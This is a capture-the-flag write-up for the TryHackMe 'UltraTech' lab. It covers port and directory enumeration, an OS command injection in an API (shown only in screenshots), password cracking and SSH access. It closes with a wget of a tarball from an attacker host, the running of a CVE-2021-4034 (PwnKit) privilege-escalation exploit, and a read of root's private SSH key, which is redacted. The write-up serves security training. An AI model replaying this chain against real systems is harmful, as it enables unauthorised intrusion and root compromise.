## UltraTech
https://tryhackme.com/room/ultratech1

## Enum
```
nmap -Pn -sC -sV -sS -p- --open ip.thm -vv
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 22:32 JST
Scanning ip.thm (10.10.171.120) [65535 ports]
Discovered open port 21/tcp on 10.10.171.120
Discovered open port 22/tcp on 10.10.171.120
Discovered open port 8081/tcp on 10.10.171.120
Discovered open port 31331/tcp on 10.10.171.120
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 61 vsftpd 3.0.3
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiFl7iswZsMnnI2RuX0ezMMVjUXFY1lJmZr3+H701ZA6nJUb2ymZyXusE/wuqL4BZ+x5gF2DLLRH7fdJkdebuuaMpQtQfEdsOMT+JakQgCDls38FH1jcrpGI3MY55eHcSilT/EsErmuvYv1s3Yvqds6xoxyvGgdptdqiaj4KFBNSDVneCSF/K7IQdbavM3Q7SgKchHJUHt6XO3gICmZmq8tSAdd2b2Ik/rYzpIiyMtfP3iWsyVgjR/q8oR08C2lFpPN8uSyIHkeH1py0aGl+V1E7j2yvVMIb4m3jGtLWH89iePTXmfLkin2feT6qAm7acdktZRJTjaJ8lEMFTHEijJ
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLy2NkFfAZMY462Bf2wSIGzla3CDXwLNlGEpaCs1Uj55Psxk5Go/Y6Cw52NEljhi9fiXOOkIxpBEC8bOvEcNeNY=
|   256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEipoohPz5HURhNfvE+WYz4Hc26k5ObMPnAQNoUDsge3
8081/tcp  open  http    syn-ack ttl 61 Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-cors: HEAD GET POST PUT DELETE PATCH
31331/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 15C1B7515662078EF4B5C724E2927A96
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
![image](https://user-images.githubusercontent.com/6504854/184535502-52353e76-69d8-4142-9794-6d5865e526f7.png)

![image](https://user-images.githubusercontent.com/6504854/184535521-098a953a-1dd0-420e-a9c0-57499681113c.png)

![image](https://user-images.githubusercontent.com/6504854/184535558-eb442110-9dc2-4946-95cd-7163cdaa5703.png)

![image](https://user-images.githubusercontent.com/6504854/184535532-a7a79ca8-b8e5-4adf-a47f-40d93c371e9b.png)
```
ffuf -u http://10.10.171.120:31331/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

```
________________________________________________

.hta                    [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 438ms]
.htaccess               [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 1918ms]
.htpasswd               [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 2927ms]
css                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 433ms]
favicon.ico             [Status: 200, Size: 15086, Words: 11, Lines: 7, Duration: 443ms]
images                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 435ms]
index.html              [Status: 200, Size: 6092, Words: 393, Lines: 140, Duration: 436ms]
javascript              [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 439ms]
js                      [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 454ms]
robots.txt              [Status: 200, Size: 53, Words: 4, Lines: 6, Duration: 445ms]
server-status           [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 431ms]
:: Progress: [4713/4713] :: Job [1/1] :: 86 req/sec :: Duration: [0:00:55] :: Errors: 0 ::
```
```
John McFamicom | r00t
Francois LeMytho | P4c0
Alvaro Squalo | Sq4l
ultratech@yopmail.com
```
🏴 I found some usernames.

```
curl http://ip.thm:31331/robots.txt
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```
```
curl http://ip.thm:31331/utech_sitemap.txt
/
/index.html
/what.html
/partners.html
```
![image](https://user-images.githubusercontent.com/6504854/184535607-0c1485db-d5c8-497d-ad25-a51f11574887.png)
![image](https://user-images.githubusercontent.com/6504854/184535674-9b08f9e3-3c00-402e-abbc-5f1cc2178d3f.png)
![image](https://user-images.githubusercontent.com/6504854/184535753-d11c13be-7edb-4bcb-b020-51613d12109f.png)

![image](https://user-images.githubusercontent.com/6504854/184536065-f02ec936-1735-4916-9bd7-7c6b9c8362dc.png)
![image](https://user-images.githubusercontent.com/6504854/184536135-93346c27-e6d9-464e-993b-aa840c50c3b3.png)
![image](https://user-images.githubusercontent.com/6504854/184536195-17f730e8-3b5c-4de2-8546-ce61df41b5b2.png)

🏴 This API has OSCommand Injection, It took me a while to find the escape characters and I stucked. 

![image](https://user-images.githubusercontent.com/6504854/184536391-4c9014ec-9c74-435c-934d-d6ef31f457d9.png)

🏴 I consulted https://crackstation.net/

## Flag
```
ssh r00t@ip.thm
r00t@ip.thm's password:
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

r00t@ultratech-prod:~$ ls -la
total 28
drwxr-xr-x 4 r00t r00t 4096 Aug 14 10:48 .
drwxr-xr-x 5 root root 4096 Mar 22  2019 ..
-rw-r--r-- 1 r00t r00t  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 r00t r00t 3771 Apr  4  2018 .bashrc
drwx------ 2 r00t r00t 4096 Aug 14 10:48 .cache
drwx------ 3 r00t r00t 4096 Aug 14 10:48 .gnupg
-rw-r--r-- 1 r00t r00t  807 Apr  4  2018 .profile

r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t:
Sorry, user r00t may not run sudo on ultratech-prod.

r00t@ultratech-prod:~$ ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 22520 Jan 15  2019 /usr/bin/pkexec

r00t@ultratech-prod:~$ wget http://10.10.10.10/1.tar
Connecting to 10.10.10.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 92160 (90K) [application/x-tar]
Saving to: ‘1.tar’

r00t@ultratech-prod:~$ tar -xvf 1.tar
./cve-2021-4034

r00t@ultratech-prod:~$ ./cve-2021-4034
# cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
****************************************************************
****************************************************************
-----END RSA PRIVATE KEY-----
```

Thank you for your time. Enjoy! 😄
